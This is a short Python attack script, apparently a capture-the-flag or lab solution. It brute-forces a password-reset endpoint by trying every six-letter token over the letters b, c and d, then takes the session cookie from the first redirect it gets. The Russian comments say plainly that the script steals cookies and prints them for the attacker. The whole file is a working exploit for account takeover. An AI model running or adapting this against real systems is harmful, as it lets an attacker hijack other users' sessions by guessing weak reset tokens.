import itertools
import requests

def generate_combinations():
    alphabet = ['b', 'c', 'd']
    length = 6
    
    combinations = itertools.product(alphabet, repeat=length)
    
    token_list = [''.join(item) for item in combinations]
    
    return token_list

all_tokens = generate_combinations()

for i in all_tokens:
  x = requests.get(f'http://[IP]:16060/reset/{i}', allow_redirects=False)
  if x.status_code == 302: # Код ответа изменился, потому что 200 возвращался главная страница после редиректа
    session_cookie = x.cookies.get_dict() # ворую куки
    print("FOUND: =======>", "status:"+str(x.status_code), "cookie:"+str(session_cookie), "link:"+str(i)) # Вывожу их себе в терминал
    break
  else:
    print(x.status_code, i)

